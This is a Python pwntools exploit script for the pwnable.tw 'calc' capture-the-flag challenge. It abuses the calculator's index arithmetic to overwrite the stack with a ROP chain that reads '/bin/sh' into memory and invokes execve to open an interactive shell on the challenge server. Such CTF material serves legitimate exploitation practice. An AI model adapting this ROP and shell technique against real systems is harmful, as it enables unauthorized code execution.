#!/usr/bin/env python3

from pwn import *

exe = ELF("./calc")

context.binary = exe
context.terminal = ['tmux','splitw','-h']


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,"""
            #b  *0x080701a9
            #commands
            #    x/30wx $ebp+4
            #end
            c
            """)
    else:
        r = remote("chall.pwnable.tw", 10100)
    return r


def main():
    r = conn()

    bin_sh=b"/bin/sh"

    main_ret_address=360
    buffer_addr=0x80eb040
    cleaner_3_pop=0x80483ac
    read_addr=0x806e6d0
    syscall_addr=0x0807087f
    pop_eax_addr=0x0805c34b
    pop_edx_ecx_ebx=0x080701d0

    #   Prepare the stack in inverse order:

    #   ROP chain
    r.sendline(f"+{main_ret_address+11}+{syscall_addr}")                 # int 0x80
    r.sendline(f"+{main_ret_address+10}+{buffer_addr}")                  # ebx=addr(/bin/sh)  
    r.sendline(f"+{main_ret_address+9}+{buffer_addr+9}")                 # ecx=NULL_ptr
    r.sendline(f"+{main_ret_address+8}+{buffer_addr+9}")                 # edx=NULL_ptr
    r.sendline(f"+{main_ret_address+7}+{pop_edx_ecx_ebx}")               # pop edx ; pop ecx ; pop ebx ; ret
    r.sendline(f"+{main_ret_address+6}+{0x0b}")                          # eax=0x0b
    r.sendline(f"+{main_ret_address+5}+{pop_eax_addr}")                  # pop eax

    #   READ /bin/sh and put it in .data
    r.sendline(f"+{main_ret_address+4}+{len(bin_sh)+1}")                 # arg3: size to read
    r.sendline(f"+{main_ret_address+3}+{buffer_addr}")                   # arg2: buffer_addr in .data
    r.sendline(f"+{main_ret_address+2}+{buffer_addr}")                   # arg1: 0 
    r.sendline(f"+{main_ret_address+3}-{buffer_addr}")                   # trick to put 0 as first param
    r.sendline(f"+{main_ret_address+1}+{cleaner_3_pop}")                 # cleaner arguments
    r.sendline(f"+{main_ret_address}+{read_addr}")                       # ret to read
    #   Trigger exploit
    r.sendline()
    #   Send /bin/sh
    r.sendline(bin_sh+b"\x00")
    #   Use the shell
    r.interactive()


if __name__ == "__main__":
    main()
